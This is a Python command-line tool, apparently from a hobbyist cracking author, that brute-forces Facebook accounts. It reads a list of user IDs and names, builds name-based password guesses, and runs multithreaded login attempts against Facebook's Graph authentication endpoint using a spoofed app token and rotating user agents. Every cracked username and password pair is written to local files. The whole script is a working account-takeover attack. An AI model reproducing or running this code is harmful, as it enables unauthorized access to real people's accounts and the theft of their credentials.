import os
import sys
import time
import uuid
import json
import random
import requests
from os import system as cmd
from requests.exceptions import ConnectionError as net_error
from concurrent.futures import ThreadPoolExecutor as speed_x

e = "\033[0m"
r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
p = "\033[1;35m"
c = "\033[1;36m"
w = "\033[1;37m"

loop = 0
idz = []
oks = []
cps = []

def oo(text):
    return f"{w}[{g}{text}{w}]"

def logo():
    cmd("clear")
    print(banner)

def linex():
    print(f"{w}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")

def main():
    logo()
    print(f" {oo('1')} File Crack ")
    print(f" {oo('2')} Follow Github ")
    print(f" {oo('3')} Exit Tool ")
    linex()
    x = input(f" {oo('?')} Select : ")
    if x == "1":
        start()
    elif x == "2":
        os.system("xdg-open https://github.com/Kazim-404")
        main()
    elif x == "3":
        linex()
        print(f" {oo('!')} {g}Thanks For Using Tool ")
        linex()
        exit()
    else:
        linex()
        print(f" {oo('!')} {g}Select Valid Option ")
        linex()
        time.sleep(1)
        main()

def start():
    logo()
    print(f" {oo('â€¢')} Example : {g}/sdcard/file.txt ")
    linex()
    try:
        file_path = input(f" {oo('?')} File Path : ")
        for x in open(file_path, "r").readlines():
            idz.append(x.strip())
    except Exception:
        linex()
        print(f" {oo('!')} File Not Found >> {g}{file_path} ")
        linex()
        time.sleep(1)
        main()
    logo()
    try:
        ps_limit = int(input(f" {oo('?')} Enter Password Limit : "))
    except ValueError:
        ps_limit = 5
    logo()
    print(f" {oo('â€¢')} Example : {g}first123, first1234, first12345 ")
    linex()
    ps_list = []
    for x in range(ps_limit):
        ps_ask = input(f" {oo(x+1)} Enter Password : ")
        ps_list.append(ps_ask)
    with speed_x(max_workers=30) as kazim:
        logo()
        total_idz = str(len(idz))
        print(f" {oo('â€¢')} Total Accounts : {g}{total_idz} ")
        print(f" {oo('!')} Brute Has Been Started ")
        print(f" {oo('!')} {r}Use Flight Mode For Speed Up ")
        linex()
        for x in idz:
            uid, name = x.split("|")
            pww = ps_list
            kazim.submit(cracker, uid, name, pww, total_idz)
    linex()
    print(f" {oo('â€¢')} Process Completed ")
    print(f" {oo('â€¢')} Total Ok Accounts : {g}{str(len(oks))} ")
    print(f" {oo('â€¢')} Total Cp Accounts : {r}{str(len(cps))} ")
    linex()
    input(f" {oo('!')} Press enter to back ")
    exit()

def cracker(uid, name, pww, total_idz):
    global loop
    global oks
    global cps
    sys.stdout.write(f"\r {w}[Running] [{loop}/{total_idz}] [{len(oks)}/{len(cps)}]\r"),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
            last = name.split(" ")[1]
        except:
            last = first
        for pw in pww:
            ps = pw.replace("first", first).replace("last", last).replace("name", name).lower()
            ua = "Mozilla/5.0 (Linux; Android 13; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.140 Mobile Safari/537.36;]Mozilla/5.0 (Linux; Android 13; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.140 Mobile Safari/537.36;]Mozilla/5.0 (Linux; Android 13; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.140 Mobile Safari/537.36;]Mozilla/5.0 (Linux; Android 13; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.140 Mobile Safari/537.36;]Mozilla/5.0 (Linux; Android 13; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.140 Mobile Safari/537.36;]Mozilla/5.0 (Linux; Android 13; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.140 Mobile Safari/537.36;]Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.140 Mobile Safari/537.36;]Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36;]Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36;]Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36;]Mozilla/5.0 (Linux; Android 12; Infinix X666 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]Mozilla/5.0 (Linux; Android 7.1.1; Infinix Zero 4 Plus Build/NMF26O; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115;]Mozilla/5.0 (Linux; Android 8.1.0; Infinix X622 Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/247.0.0.42.116;]Mozilla/5.0 (Linux; Android 8.1.0; Infinix X622 Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115;]Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.26.76;]Mozilla/5.0 (Linux; Android 12; Infinix X677 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]Mozilla/5.0 (Linux; Android 11; Infinix X6816D Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115;]Mozilla/5.0 (Linux; Android 12; Infinix X672 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]Mozilla/5.0 (Linux; Android 11; Infinix X695 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) VenusBrowser/5.0.0 Chrome/117.0.0.0 Mobile Safari/537.36;]Mozilla/5.0 (Linux; Android 12; Infinix X677 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]Mozilla/5.0 (Linux; Android 12; Infinix X6517 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]Mozilla/5.0 (Linux; Android 12; Infinix X671 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/411.1.0.29.112;]Mozilla/5.0 (Linux; Android 12; Infinix X6517 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]Mozilla/5.0 (Linux; U; Android 13; en-US; Infinix X6716B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.5.2.1312 Mobile Safari/537.36;]Mozilla/5.0 (Linux; Android 12; Infinix X6517 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]Mozilla/5.0 (Linux; Android 12; Infinix X668 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115;]Mozilla/5.0 (Linux; Android 13; Infinix X6710 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115;]Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111;]Mozilla/5.0 (Linux; Android 12; Infinix X668C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111;]Mozilla/5.0 (Linux; Android 12; Infinix X6517 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115;]"
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': uid,
                'password': ps,
                'generate_analytics_claims': '1',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            }
            headers = {
                'User-Agent': ua,
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '33055',
                'X-FB-SIM-HNI': '32866',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Connection-Type': 'WIFI',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
            }
            url = "https://b-graph.facebook.com/auth/login"
            result = requests.post(url, data=data, headers=headers).json()
            if "session_key" in result:
                print(f" {g}[KAZIM-OK] {uid}|{ps}")
                open("/sdcard/Kazim-Ok.txt", "a").write(f"{uid}|{ps}")
                oks.append(uid)
                break
            elif "www.facebook.com" in result["error"]["message"]:
                print(f" {r}[KAZIM-CP] {uid}|{ps}")
                open("/sdcard/Kazim-Cp.txt", "a").write(f"{uid}|{ps}")
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except net_error:
        time.sleep(10)
    except:
        pass

banner = f"""{w}\
{w}  db   dD  .d8b.  d88888D d888888b .88b  d88. 
{w}  88 ,8P' d8' `8b YP  d8'   `88'   88'YbdP`88 
{g}  88,8P   88ooo88    d8'     88    88  88  88 
{g}  88`8b   88~~~88   d8'      88    88  88  88 
{w}  88 `88. 88   88  d8' db   .88.   88  88  88 
{w}  YP   YD YP   YP d88888P Y888888P YP  YP  YP 
{w}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 {oo('â€¢')} Author  : Muhammad Kazim
 {oo('â€¢')} GitHub  : https://github.com/Kazim-404
 {oo('â€¢')} Version : 0.1
{w}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\
"""

main()
